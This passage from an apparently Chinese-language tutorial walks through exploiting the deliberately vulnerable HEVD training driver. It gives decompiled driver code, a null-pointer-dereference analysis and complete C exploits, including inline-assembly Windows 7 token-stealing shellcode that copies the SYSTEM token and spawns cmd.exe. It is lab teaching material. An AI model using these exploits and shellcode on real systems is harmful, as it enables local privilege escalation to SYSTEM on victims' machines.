</span></span><span class="line"><span class="cl">	<span class="n">STARTUPINFO</span> <span class="n">si</span> <span class="o">=</span> <span class="p">{</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">si</span><span class="p">)</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl">	<span class="n">PROCESS_INFORMATION</span> <span class="n">pi</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl">	<span class="n">si</span><span class="p">.</span><span class="n">dwFlags</span> <span class="o">=</span> <span class="n">STARTF_USESHOWWINDOW</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">si</span><span class="p">.</span><span class="n">wShowWindow</span> <span class="o">=</span> <span class="n">SW_SHOW</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">WCHAR</span> <span class="n">wzFilePath</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="sa">L</span><span class="s">&#34;cmd.exe&#34;</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl">	<span class="n">BOOL</span> <span class="n">bReturn</span> <span class="o">=</span> <span class="nf">CreateProcessW</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">wzFilePath</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">CREATE_NEW_CONSOLE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="p">(</span><span class="n">LPSTARTUPINFOW</span><span class="p">)</span><span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pi</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">bReturn</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="nf">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">),</span> <span class="nf">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mh">0x82C</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">	<span class="n">DWORD</span> <span class="n">dwret</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">HANDLE</span> <span class="n">hDevice</span> <span class="o">=</span> <span class="nf">CreateFileA</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">HackSysExtremeVulnerableDriver&#34;</span><span class="p">,</span> <span class="n">GENERIC_READ</span> <span class="o">|</span> <span class="n">GENERIC_WRITE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nf">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="sc">&#39;A&#39;</span><span class="p">,</span> <span class="mh">0x824</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="o">*</span><span class="p">(</span><span class="n">PDWORD</span><span class="p">)(</span><span class="n">buffer</span> <span class="o">+</span> <span class="mh">0x824</span><span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">TokenStealingPayloadWin7</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="o">*</span><span class="p">(</span><span class="n">PDWORD</span><span class="p">)(</span><span class="n">buffer</span> <span class="o">+</span> <span class="mh">0x828</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0xBAD0B0B0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="nf">DeviceIoControl</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="mh">0x222027</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mh">0xffffffff</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwret</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nf">CreateCmd</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><h2 id="9nullpointerdereference" class="heading-element">
  <a href="#9nullpointerdereference" class="heading-mark"></a>9.NullPointerDereference</h2><p>原理：空指针<code>Null Pointer</code>指向0地址空间，如果不加判断就对其进行引用，会造成不可预知的后果。可以在0地址写入<code>shellcode</code>，通过调用空指针执行。</p>
<h3 id="漏洞分析-4" class="heading-element">
  <a href="#%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90-4" class="heading-mark"></a>漏洞分析</h3><p>释放之后依然对<code>v[1]</code>进行调用，此时其实是对<code>0x00000004</code>地址进行调用，利用方法就是，在<code>0x00000004</code>地址处写入<code>shellcode</code>的地址，然后通过IO控制码<code>0x22202b</code>与<code>HEVD</code>驱动通信，随便传入不为0的用户缓冲区即可：</p>
<div class="highlight" id="id-95"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__stdcall</span> <span class="nf">TriggerNullPointerDereference</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">UserBuffer</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">const</span> <span class="kt">void</span> <span class="o">**</span><span class="n">v1</span><span class="p">;</span> <span class="c1">// edi
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// esi
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">v4</span><span class="p">)(</span><span class="n">ULONG</span><span class="p">,</span> <span class="n">ULONG</span><span class="p">,</span> <span class="n">PCSTR</span><span class="p">,</span> <span class="p">...);</span> <span class="c1">// esi
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="nf">ProbeForRead</span><span class="p">(</span><span class="n">UserBuffer</span><span class="p">,</span> <span class="mi">8u</span><span class="p">,</span> <span class="mi">1u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">v1</span> <span class="o">=</span> <span class="nf">ExAllocatePoolWithTag</span><span class="p">(</span><span class="n">NonPagedPool</span><span class="p">,</span> <span class="mi">8u</span><span class="p">,</span> <span class="mh">0x6B636148u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] Pool Tag: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="s">&#34;&#39;kcaH&#39;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] Pool Type: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="s">&#34;NonPagedPool&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] Pool Size: 0x%X</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] Pool Chunk: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">v1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">v3</span> <span class="o">=</span> <span class="o">*</span><span class="n">UserBuffer</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] UserValue: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="o">*</span><span class="n">UserBuffer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] NullPointerDereference: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">v1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">==</span> <span class="mh">0xBAD0B0B0</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="o">*</span><span class="n">v1</span> <span class="o">=</span> <span class="mh">0xBAD0B0B0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">v1</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">NullPointerDereferenceObjectCallback</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">v4</span> <span class="o">=</span> <span class="n">_DbgPrintEx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] NullPointerDereference-&gt;Value: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="o">*</span><span class="n">v1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] NullPointerDereference-&gt;Callback: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">v1</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">v4</span> <span class="o">=</span> <span class="n">_DbgPrintEx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] Freeing NullPointerDereference Object</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] Pool Tag: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="s">&#34;&#39;kcaH&#39;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] Pool Chunk: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">v1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">ExFreePoolWithTag</span><span class="p">(</span><span class="n">v1</span><span class="p">,</span> <span class="mh">0x6B636148u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">v1</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">v4</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] Triggering Null Pointer Dereference</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="n">v1</span><span class="p">[</span><span class="mi">1</span><span class="p">])();</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[-] Unable to allocate Pool chunk</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1073741801</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><h3 id="漏洞利用-2" class="heading-element">
  <a href="#%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8-2" class="heading-mark"></a>漏洞利用</h3><p><code>VirtualAlloc</code>不允许在零页上申请内存空间的，所以需要使用到<code>NtAllocateVirtualMemory</code>来申请内存空间</p>
<div class="highlight" id="id-96"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">__kernel_entry</span> <span class="n">NTSYSCALLAPI</span> <span class="n">NTSTATUS</span> <span class="nf">NtAllocateVirtualMemory</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="n">in</span><span class="p">]</span>      <span class="n">HANDLE</span>    <span class="n">ProcessHandle</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="n">in</span><span class="p">,</span> <span class="n">out</span><span class="p">]</span> <span class="n">PVOID</span>     <span class="o">*</span><span class="n">BaseAddress</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="n">in</span><span class="p">]</span>      <span class="n">ULONG_PTR</span> <span class="n">ZeroBits</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="n">in</span><span class="p">,</span> <span class="n">out</span><span class="p">]</span> <span class="n">PSIZE_T</span>   <span class="n">RegionSize</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="n">in</span><span class="p">]</span>      <span class="n">ULONG</span>     <span class="n">AllocationType</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="n">in</span><span class="p">]</span>      <span class="n">ULONG</span>     <span class="n">Protect</span>
</span></span><span class="line"><span class="cl"><span class="p">);</span></span></span></code></pre></div><blockquote>
<p>BaseAddress：指向变量的指针，该变量将接收已分配页面区域的基地址。如果BaseAddress的初始值非NULL，则从指定的虚拟地址开始分配区域，向下舍入到下一个主机页面大小地址边界。如果BaseAddress的初始值为NULL ，操作系统将决定在哪里分配该区域。</p>
</blockquote>
<p>当参数2设置为1时，将会自动向下取整整个页面大小，写入0时则由系统来给你定，这里是0页，所以要自己定位置</p>
<h3 id="exp-4" class="heading-element">
  <a href="#exp-4" class="heading-mark"></a>EXP</h3><div class="highlight" id="id-97"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">##include &lt;stdio.h&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp">##include &lt;Windows.h&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="nf">NTSTATUS</span><span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span><span class="n">My_NtAllocateVirtualMemory</span><span class="p">)(</span>
</span></span><span class="line"><span class="cl">    <span class="n">IN</span> <span class="n">HANDLE</span> <span class="n">ProcessHandle</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">IN</span> <span class="n">OUT</span> <span class="n">PVOID</span> <span class="o">*</span><span class="n">BaseAddress</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">IN</span> <span class="n">ULONG</span> <span class="n">ZeroBits</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">IN</span> <span class="n">OUT</span> <span class="n">PULONG</span> <span class="n">RegionSize</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">IN</span> <span class="n">ULONG</span> <span class="n">AllocationType</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">IN</span> <span class="n">ULONG</span> <span class="n">Protect</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">My_NtAllocateVirtualMemory</span> <span class="n">NtAllocateVirtualMemory</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="n">VOID</span> <span class="nf">TokenStealingPayloadWin7</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Importance of Kernel Recovery
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kr">__asm</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="n">pushad</span>
</span></span><span class="line"><span class="cl">		<span class="n">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span><span class="p">;</span> <span class="n">eax设置为0</span>
</span></span><span class="line"><span class="cl">		<span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="nl">fs</span><span class="p">:</span> <span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="mi">124</span><span class="n">h</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">		<span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="mo">050</span><span class="n">h</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">		<span class="n">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">eax</span>
</span></span><span class="line"><span class="cl">		<span class="n">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="mi">4</span>
</span></span><span class="line"><span class="cl">		<span class="nl">SearchSystemPID</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">						<span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="mi">0</span><span class="n">b8h</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">						<span class="n">sub</span> <span class="n">eax</span><span class="p">,</span> <span class="mi">0</span><span class="n">b8h</span>
</span></span><span class="line"><span class="cl">						<span class="n">cmp</span><span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="mi">0</span><span class="n">b4h</span><span class="p">],</span> <span class="n">edx</span>
</span></span><span class="line"><span class="cl">						<span class="n">jne</span> <span class="n">SearchSystemPID</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">						<span class="n">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="mf">0f</span><span class="mi">8</span><span class="n">h</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">						<span class="n">mov</span><span class="p">[</span><span class="n">ecx</span> <span class="o">+</span> <span class="mf">0f</span><span class="mi">8</span><span class="n">h</span><span class="p">],</span> <span class="n">edx</span>
</span></span><span class="line"><span class="cl">						<span class="n">popad</span>
</span></span><span class="line"><span class="cl">						<span class="n">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
</span></span><span class="line"><span class="cl">						<span class="n">add</span> <span class="n">esp</span><span class="p">,</span> <span class="mi">12</span>
</span></span><span class="line"><span class="cl">						<span class="n">pop</span> <span class="n">ebp</span>
</span></span><span class="line"><span class="cl">						<span class="n">ret</span> <span class="mi">8</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">VOID</span> <span class="nf">CreateCmd</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">STARTUPINFO</span> <span class="n">si</span> <span class="o">=</span> <span class="p">{</span><span class="k">sizeof</span><span class="p">(</span><span class="n">si</span><span class="p">)};</span>
</span></span><span class="line"><span class="cl">    <span class="n">PROCESS_INFORMATION</span> <span class="n">pi</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="n">si</span><span class="p">.</span><span class="n">dwFlags</span> <span class="o">=</span> <span class="n">STARTF_USESHOWWINDOW</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">si</span><span class="p">.</span><span class="n">wShowWindow</span> <span class="o">=</span> <span class="n">SW_SHOW</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">WCHAR</span> <span class="n">wzFilePath</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="sa">L</span><span class="s">&#34;cmd.exe&#34;</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="n">BOOL</span> <span class="n">bReturn</span> <span class="o">=</span> <span class="nf">CreateProcessW</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">wzFilePath</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">CREATE_NEW_CONSOLE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="p">(</span><span class="n">LPSTARTUPINFOW</span><span class="p">)</span><span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pi</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">bReturn</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nf">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">),</span> <span class="nf">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">DWORD</span> <span class="n">dwret</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">HANDLE</span> <span class="n">hDevice</span> <span class="o">=</span> <span class="nf">CreateFileA</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">HackSysExtremeVulnerableDriver&#34;</span><span class="p">,</span> <span class="n">GENERIC_READ</span> <span class="o">|</span> <span class="n">GENERIC_WRITE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="n">PDWORD32</span><span class="p">)(</span><span class="n">buffer</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0xBAD0B0B0</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">PVOID</span> <span class="n">Zero_addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">SIZE_T</span> <span class="n">RegionSize</span> <span class="o">=</span> <span class="mh">0x1000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="n">FARPROC</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">NtAllocateVirtualMemory</span> <span class="o">=</span> <span class="nf">GetProcAddress</span><span class="p">(</span><span class="nf">GetModuleHandleW</span><span class="p">(</span><span class="sa">L</span><span class="s">&#34;ntdll&#34;</span><span class="p">),</span> <span class="s">&#34;NtAllocateVirtualMemory&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">NtAllocateVirtualMemory</span><span class="p">(</span><span class="n">INVALID_HANDLE_VALUE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">Zero_addr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">RegionSize</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="n">DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="mh">0x4</span><span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="o">&amp;</span><span class="n">TokenStealingPayloadWin7</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">DeviceIoControl</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="mh">0x22202B</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwret</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">CreateCmd</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><h2 id="10triggeruninitializedmemorystackexp存在问题" class="heading-element">
  <a href="#10triggeruninitializedmemorystackexp%e5%ad%98%e5%9c%a8%e9%97%ae%e9%a2%98" class="heading-mark"></a>10.TriggerUninitializedMemoryStack(EXP存在问题)</h2><p>未初始化栈变量，本部分使用新的利用手法：栈喷射</p>
<h3 id="漏洞分析-5" class="heading-element">
  <a href="#%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90-5" class="heading-mark"></a>漏洞分析</h3><p>首先设置了个未初始化的变量<code>UninitializedMemory</code>，之后判断<code>UserBuffer</code>值，如果等于<code>0xBAD0B0B0</code>就设置<code>UninitializedMemory</code>的一些值，最后判断是否有回调函数，然后调用：</p>
<div class="highlight" id="id-98"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__stdcall</span> <span class="nf">TriggerUninitializedMemoryStack</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">UserBuffer</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// esi
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">_UNINITIALIZED_MEMORY_STACK</span> <span class="n">UninitializedMemory</span><span class="p">;</span> <span class="c1">// [esp+14h] [ebp-10Ch] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">CPPEH_RECORD</span> <span class="n">ms_exc</span><span class="p">;</span> <span class="c1">// [esp+108h] [ebp-18h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
